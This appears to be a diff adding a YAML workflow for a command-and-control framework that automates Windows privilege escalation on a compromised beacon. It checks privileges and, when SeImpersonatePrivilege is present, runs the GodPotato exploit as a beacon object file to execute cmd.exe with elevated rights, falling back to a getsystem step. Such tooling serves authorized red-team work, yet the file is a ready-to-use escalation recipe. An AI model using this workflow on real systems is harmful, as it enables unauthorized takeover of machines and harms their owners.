@@ -1,0 +1,28 @@
+name: Interactive Privilege Escalation Workflow
+# beacon_id is omitted - will prompt user to select from available beacons
+
+actions:
+  # Run whoami to check current privileges
+  - name: check_privileges
+    type: getuid
+
+  # If SeImpersonatePrivilege exists, run exploit
+  - name: exploit_impersonate
+    type: bof_string
+    parameters:
+      bof: /opt/bofs/GodPotato.o
+      entrypoint: go
+      arguments: "-cmd C:\\Windows\\System32\\cmd.exe /c whoami"
+    conditions:
+      - type: output_check
+        source: check_privileges
+        operator: contains
+        value: SeImpersonatePrivilege
+        case_sensitive: false
+    on_success:
+      - name: verify_elevation
+        type: getuid
+
+    on_failure:
+      - name: fallback_getsystem
+        type: getsystem
